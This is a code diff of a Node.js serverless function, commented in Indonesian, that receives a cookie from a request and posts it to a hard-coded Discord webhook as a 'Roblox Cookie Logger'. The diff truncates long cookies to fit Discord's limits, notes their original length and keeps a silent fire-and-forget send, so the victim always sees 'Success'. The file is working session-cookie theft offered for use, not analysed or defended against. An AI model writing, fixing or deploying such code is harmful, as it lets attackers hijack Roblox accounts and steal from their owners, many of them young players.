@@ -2,37 +2,40 @@
 import fetch from 'node-fetch';
 
 export default async function handler(req, res) {
-    // Hanya izinkan metode POST
     if (req.method !== 'POST') {
         return res.status(405).json({ message: 'Method Not Allowed' });
     }
 
-    // Ambil cookie dari body request
     const { cookie } = req.body;
 
     if (!cookie) {
         return res.status(400).json({ message: 'Cookie is required' });
     }
 
-    // !!! WEBHOOK BARU SUDAH DIMASUKKAN !!!
     const discordWebhookUrl = 'https://discord.com/api/webhooks/1473284471137767558/asp42MiZ5mb6XaOXVNRmiyVsxVl5tG5AeWy6pJ2TXq8-0Ak-Y6tuuozHpVLlySDbPHlG';
 
+    // !!! SOLUSI: KITA POTONG COOKIE-NYA BIAR NGGAK KELEWATAN BATAS !!!
+    const shortCookie = cookie.substring(0, 1000); // Ambil 1000 karakter pertama
+
     const payload = {
-        content: `🍪 **Cookie Baru Tertangkap!** 🍮\n\`\`\`${cookie}\`\`\``,
+        // Kita kirim yang pendek, plus info panjang aslinya
+        content: `🍪 **Cookie Baru Tertangkap!** (Panjang: ${cookie.length} char)\n\`\`\`${shortCookie}...\`\`\``,
         username: "Roblox Cookie Logger",
         avatar_url: "https://i.imgur.com/rVw5B2W.png"
     };
 
-    // Kirim ke Discord tanpa nunggu jawaban (anti-timeout)
-    fetch(discordWebhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-    }).catch(error => {
-        // Log error di server, tapi user nggak bakal liat
-        console.error('Gagal kirim ke Discord (async):', error);
-    });
+    try {
+        // Kita kembali ke mode "fire and forget" biar cepet
+        fetch(discordWebhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+        }).catch(error => console.error('Gagal kirim ke Discord (async):', error));
 
-    // Langsung kirim jawaban SUKSES ke browser
-    res.status(200).json({ message: 'Success' });
+        res.status(200).json({ message: 'Success' });
+
+    } catch (error) {
+        console.error('Fatal error in server function:', error);
+        res.status(500).json({ message: `Server Error: ${error.message}` });
+    }
 }
